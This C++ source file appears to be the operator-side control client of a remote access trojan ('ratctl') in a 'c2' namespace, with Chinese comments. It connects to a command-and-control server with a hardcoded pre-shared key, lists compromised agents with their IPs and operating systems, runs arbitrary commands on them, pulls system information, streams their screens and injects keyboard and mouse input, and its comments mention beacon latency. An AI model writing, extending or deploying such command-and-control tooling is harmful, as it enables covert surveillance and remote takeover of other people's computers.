// ctl_client.cpp — CONTROL 客户端实现（移植 ratctl 逻辑）
#include "ctl_client.h"

#include "../../client/core/crypto.h"
#include "../../client/core/net.h"
#include "../../client/core/protocol.h"

#include <bcrypt.h>
#include <wincodec.h>
#include <wrl/client.h>

#include <cstdio>
#include <cstring>
#include <sstream>

namespace ctl
{

    namespace
    {

        constexpr char kPskHex[] =
            "0102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f20";
        constexpr uint32_t kHelloVersion = (1u << 16) | 1u;

        using Microsoft::WRL::ComPtr;

        bool hex_decode(const std::string &hx, std::vector<uint8_t> &out)
        {
            if (hx.size() % 2 != 0)
                return false;
            out.resize(hx.size() / 2);
            for (size_t i = 0; i < out.size(); ++i)
            {
                auto nib = [](char c) -> int
                {
                    if (c >= '0' && c <= '9')
                        return c - '0';
                    if (c >= 'a' && c <= 'f')
                        return c - 'a' + 10;
                    if (c >= 'A' && c <= 'F')
                        return c - 'A' + 10;
                    return -1;
                };
                int hi = nib(hx[i * 2]), lo = nib(hx[i * 2 + 1]);
                if (hi < 0 || lo < 0)
                    return false;
                out[i] = (uint8_t)((hi << 4) | lo);
            }
            return true;
        }

    } // namespace

    CtlClient::~CtlClient() { disconnect(); }

    bool CtlClient::connect(const std::string &host, uint16_t port, std::string &err)
    {
        if (!c2::net_init())
        {
            err = "WSAStartup failed";
            return false;
        }
        SOCKET s = INVALID_SOCKET;
        if (!c2::net_connect(host, port, &s, 5000))
        {
            err = "connect failed: " + c2::net_last_error();
            return false;
        }
        sock_ = s;
        if (!handshake(err))
        {
            c2::net_close(sock_);
            sock_ = INVALID_SOCKET;
            return false;
        }
        running_.store(true);
        reader_ = std::thread(&CtlClient::readLoop, this);
        return true;
    }

    void CtlClient::disconnect()
    {
        running_.store(false);
        if (sock_ != INVALID_SOCKET)
        {
            c2::net_close(sock_);
            sock_ = INVALID_SOCKET;
        }
        if (reader_.joinable())
            reader_.join();
    }

    bool CtlClient::handshake(std::string &err)
    {
        // PSK
        std::vector<uint8_t> psk;
        if (!hex_decode(kPskHex, psk))
        {
            err = "bad psk";
            return false;
        }
        // client_nonce
        uint8_t clientNonce[16];
        BCryptGenRandom(nullptr, clientNonce, 16, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

        // HELLO（明文）：ver(4) + role(1) + agent_id(16,0) + client_nonce(16)
        std::vector<uint8_t> hello;
        uint32_t ver = kHelloVersion;
        for (int i = 0; i < 4; ++i)
            hello.push_back((uint8_t)(ver >> (8 * i)));
        hello.push_back(c2::kRoleControl);
        hello.insert(hello.end(), 16, 0);
        hello.insert(hello.end(), clientNonce, clientNonce + 16);
        c2::Header h;
        h.cmd = c2::kCmdHello;
        if (!c2::net_write_packet(sock_, h, hello.data(), hello.size()))
        {
            err = "send hello failed";
            return false;
        }
        c2::Header ah;
        std::vector<uint8_t> ack;
        if (!c2::net_read_packet(sock_, ah, ack, 5000) || ah.cmd != c2::kCmdHelloAck ||
            ack.size() < 1 + 16 || ack[0] != 0)
        {
            err = "handshake failed";
            return false;
        }
        const uint8_t *serverNonce = ack.data() + 1;
        key_ = c2::derive_session_key(psk.data(), psk.size(), clientNonce, serverNonce);
        return true;
    }

    bool CtlClient::sendRaw(uint16_t cmd, uint8_t plugin,
                            const std::vector<uint8_t> &payload, uint32_t seq)
    {
        std::lock_guard<std::mutex> lock(sendMx_); // 写连接串行化（多线程安全）
        std::vector<uint8_t> sealed;
        std::string err;
        if (!c2::aes_gcm_encrypt(key_.data(), key_.size(),
                                 payload.data(), payload.size(), sealed, err))
            return false;
        c2::Header h;
        h.flags = c2::kFlagEncrypted;
        h.seq = seq;
        h.cmd = cmd;
        h.plugin = plugin;
        return c2::net_write_packet(sock_, h, sealed.data(), sealed.size());
    }

    bool CtlClient::sendAndWait(uint16_t cmd, uint8_t plugin,
                                const std::vector<uint8_t> &payload, uint16_t wantCmd,
                                uint8_t &status, std::vector<uint8_t> &body,
                                std::string &err, int timeoutMs)
    {
        uint32_t seq = seq_.fetch_add(1) + 1;
        Pending p;
        {
            std::lock_guard<std::mutex> lk(pendMx_);
            pend_[seq] = &p;
        }
        if (!sendRaw(cmd, plugin, payload, seq))
        {
            std::lock_guard<std::mutex> lk(pendMx_);
            pend_.erase(seq);
            err = "send failed";
            return false;
        }
        std::unique_lock<std::mutex> lk(p.mx);
        if (!p.cv.wait_for(lk, std::chrono::milliseconds(timeoutMs), [&]
                           { return p.done; }))
        {
            std::lock_guard<std::mutex> l2(pendMx_);
            pend_.erase(seq);
            err = "timeout waiting response";
            return false;
        }
        // 服务器同步错误：cmd=原指令码且 status!=OK
        if (p.cmd == cmd && p.status != c2::kStatusOK)
        {
            status = p.status;
            err = "server status=" + std::to_string(p.status);
            return false;
        }
        if (p.cmd != wantCmd)
        {
            err = "unexpected response cmd=0x" + std::to_string(p.cmd);
            return false;
        }
        status = p.status;
        body = std::move(p.body);
        return true;
    }

    void CtlClient::readLoop()
    {
        while (running_.load())
        {
            c2::Header h;
            std::vector<uint8_t> raw;
            if (!c2::net_read_packet(sock_, h, raw, -1))
            {
                running_.store(false);
                break;
            }
            std::vector<uint8_t> body;
            std::string err;
            if (!(h.flags & c2::kFlagEncrypted) ||
                !c2::aes_gcm_decrypt(key_.data(), key_.size(),
                                     raw.data(), raw.size(), body, err))
            {
                continue;
            }
            // 屏幕帧：不经 pending，直接回调；且不参与防重放
            // （帧 seq 是 Agent 侧递增，与 ctl 请求-响应 seq 空间独立，否则帧会
            //   快速推进 lastSeq_ 导致后续 CMD_RESULT 被误判乱序丢弃）
            if (h.cmd == c2::kCmdScreenFrame)
            {
                if (frameCb_ && body.size() >= 12)
                {
                    uint32_t fseq;
                    int w, hh;
                    uint32_t jl;
                    std::memcpy(&fseq, body.data(), 4);
                    w = body[4] | (body[5] << 8);
                    hh = body[6] | (body[7] << 8);
                    std::memcpy(&jl, body.data() + 8, 4);
                    if (body.size() >= 12 + jl)
                        frameCb_(fseq, w, hh, body.data() + 12, jl);
                }
                continue;
            }
            // 防重放（仅请求-响应包；帧已在上方处理并 continue）
            {
                std::lock_guard<std::mutex> lk(seqMx_);
                if (h.seq <= lastSeq_)
                    continue;
                lastSeq_ = h.seq;
            }
            Pending *p = nullptr;
            {
                std::lock_guard<std::mutex> lk(pendMx_);
                auto it = pend_.find(h.seq);
                if (it != pend_.end())
                {
                    p = it->second;
                    pend_.erase(it);
                }
            }
            if (p)
            {
                std::lock_guard<std::mutex> lk(p->mx);
                p->cmd = h.cmd;
                p->status = h.status;
                p->body = std::move(body);
                p->done = true;
                p->cv.notify_one();
            }
        }
    }

    bool CtlClient::listSessions(std::vector<SessionInfo> &out, std::string &err)
    {
        uint8_t status = 0;
        std::vector<uint8_t> body;
        if (!sendAndWait(c2::kCtlList, c2::kPluginCtl, {}, c2::kCtlList,
                         status, body, err))
            return false;
        // 解码会话表（协议 §5.3）
        size_t off = 0;
        auto rd32 = [&]() -> uint32_t
        {
            if (off + 4 > body.size())
                return 0;
            uint32_t v = (uint32_t)body[off] | ((uint32_t)body[off + 1] << 8) |
                         ((uint32_t)body[off + 2] << 16) | ((uint32_t)body[off + 3] << 24);
            off += 4;
            return v;
        };
        auto rd16 = [&]() -> uint16_t
        {
            if (off + 2 > body.size())
                return 0;
            uint16_t v = (uint16_t)body[off] | ((uint16_t)body[off + 1] << 8);
            off += 2;
            return v;
        };
        auto rd8 = [&]() -> uint8_t
        { return off < body.size() ? body[off++] : 0; };
        uint32_t count = rd32();
        for (uint32_t i = 0; i < count; ++i)
        {
            SessionInfo s;
            if (off + 16 > body.size())
                break;
            char hexbuf[33];
            for (int j = 0; j < 16; ++j)
                std::snprintf(hexbuf + j * 2, 3, "%02x", body[off + j]);
            hexbuf[32] = 0;
            s.id = hexbuf;
            off += 16;
            if (off + 4 > body.size())
                break;
            char ipbuf[16];
            std::snprintf(ipbuf, sizeof(ipbuf), "%u.%u.%u.%u", body[off], body[off + 1],
                          body[off + 2], body[off + 3]);
            s.ip = ipbuf;
            off += 4;
            s.port = rd16();
            uint16_t oslen = rd16();
            if (off + oslen > body.size())
                break;
            s.os.assign((const char *)body.data() + off, oslen);
            off += oslen;
            s.plugins = rd32();
            s.lastSeenMs = rd32() | ((uint64_t)rd32() << 32);
            s.online = rd8() != 0;
            out.push_back(std::move(s));
        }
        return true;
    }

    bool CtlClient::business(uint8_t plugin, uint16_t cmd, const std::string &agentId,
                             const std::vector<uint8_t> &args,
                             std::string &result, std::string &err,
                             int timeoutMs)
    {
        std::vector<uint8_t> agentID;
        if (!hex_decode(agentId, agentID) || agentID.size() != 16)
        {
            err = "bad agent id";
            return false;
        }
        std::vector<uint8_t> payload = agentID;
        payload.insert(payload.end(), args.begin(), args.end());
        uint8_t status = 0;
        std::vector<uint8_t> body;
        if (!sendAndWait(cmd, plugin, payload, c2::kCmdResult,
                         status, body, err, timeoutMs))
            return false;
        if (body.size() < 5)
        {
            err = "short result";
            return false;
        }
        if (body[4] != c2::kStatusOK)
        {
            err = "agent status=" + std::to_string(body[4]);
            return false;
        }
        result.assign((const char *)body.data() + 5, body.size() - 5);
        return true;
    }

    bool CtlClient::sysinfo(const std::string &agentId, std::string &result, std::string &err)
    {
        return business(c2::kPluginSys, c2::kCmdSysInfo, agentId, {}, result, err);
    }

    bool CtlClient::exec(const std::string &agentId, const std::string &command,
                         std::string &result, std::string &err)
    {
        std::vector<uint8_t> args(command.begin(), command.end());
        return business(c2::kPluginSys, c2::kCmdExecPs, agentId, args, result, err);
    }

    bool CtlClient::screenStream(const std::string &agentId, uint8_t control,
                                 uint8_t fps, uint8_t quality, uint8_t scalePercent,
                                 std::string &err, bool wait)
    {
        std::vector<uint8_t> args;
        args.push_back(control);
        args.push_back(fps);
        args.push_back(quality);
        args.push_back(scalePercent > 0 ? scalePercent : 100);

        if (!wait)
        {
            // 只发送不等回执（viewer：启动/停止都不能阻塞，否则退出时来不及发 stop）
            std::vector<uint8_t> agentID;
            if (!hex_decode(agentId, agentID) || agentID.size() != 16)
            {
                err = "bad agent id";
                return false;
            }
            std::vector<uint8_t> payload = agentID;
            payload.insert(payload.end(), args.begin(), args.end());
            uint32_t seq = seq_.fetch_add(1) + 1;
            if (!sendRaw(c2::kCmdScreenStream, c2::kPluginRemote, payload, seq))
            {
                err = "send screen stream failed";
                return false;
            }
            return true;
        }

        std::string result;
        // start/stop 应秒级完成；beacon 原因同步会有高延迟，需要耐心等待
        return business(c2::kPluginRemote, c2::kCmdScreenStream, agentId, args,
                        result, err, 240000);
    }

    bool CtlClient::sendInputEvents(const std::string &agentId,
                                    const std::vector<c2::InputEvent> &events,
                                    std::string &err)
    {
        if (events.empty())
            return true;
        std::vector<uint8_t> agentID;
        if (!hex_decode(agentId, agentID) || agentID.size() != 16)
        {
            err = "bad agent id";
            return false;
        }
        std::vector<uint8_t> payload = agentID;
        uint32_t count = (uint32_t)events.size();
        for (int i = 0; i < 4; ++i)
            payload.push_back((uint8_t)(count >> (8 * i)));
        payload.insert(payload.end(), (const uint8_t *)events.data(),
                       (const uint8_t *)events.data() + events.size() * sizeof(c2::InputEvent));

        uint32_t seq = seq_.fetch_add(1) + 1;
        if (!sendRaw(c2::kCmdInputEvents, c2::kPluginRemote, payload, seq))
        {
            err = "send input events failed";
            return false;
        }
        return true; // 实时流：不等待响应（失败由服务器回 NoSession 或忽略）
    }

    // ---- JPEG 解码（WIC → BGRA）----

    bool decode_jpeg_to_bgra(const uint8_t *jpeg, size_t len,
                             int &w, int &h, std::vector<uint8_t> &bgra)
    {
        HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
        bool needUninit = SUCCEEDED(hr);
        ComPtr<IWICImagingFactory> factory;
        if (FAILED(CoCreateInstance(CLSID_WICImagingFactory, nullptr, CLSCTX_INPROC_SERVER,
                                    IID_PPV_ARGS(&factory))))
        {
            if (needUninit)
                CoUninitialize();
            return false;
        }
        HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, len);
        void *p = GlobalLock(hg);
        std::memcpy(p, jpeg, len);
        GlobalUnlock(hg);
        ComPtr<IStream> stream;
        CreateStreamOnHGlobal(hg, TRUE, &stream);

        ComPtr<IWICBitmapDecoder> decoder;
        if (FAILED(factory->CreateDecoderFromStream(stream.Get(), nullptr,
                                                    WICDecodeMetadataCacheOnLoad,
                                                    &decoder)))
        {
            if (needUninit)
                CoUninitialize();
            return false;
        }
        ComPtr<IWICBitmapFrameDecode> frame;
        if (FAILED(decoder->GetFrame(0, &frame)))
        {
            if (needUninit)
                CoUninitialize();
            return false;
        }
        UINT fw = 0, fh = 0;
        frame->GetSize(&fw, &fh);
        w = (int)fw;
        h = (int)fh;
        // 转成 32bppBGRA
        ComPtr<IWICFormatConverter> conv;
        if (FAILED(factory->CreateFormatConverter(&conv)) ||
            FAILED(conv->Initialize(frame.Get(), GUID_WICPixelFormat32bppBGRA,
                                    WICBitmapDitherTypeNone, nullptr, 0.0,
                                    WICBitmapPaletteTypeCustom)))
        {
            if (needUninit)
                CoUninitialize();
            return false;
        }
        bgra.resize((size_t)fw * fh * 4);
        if (FAILED(conv->CopyPixels(nullptr, fw * 4, (UINT)bgra.size(), bgra.data())))
        {
            if (needUninit)
                CoUninitialize();
            return false;
        }
        if (needUninit)
            CoUninitialize();
        return true;
    }

} // namespace ctl
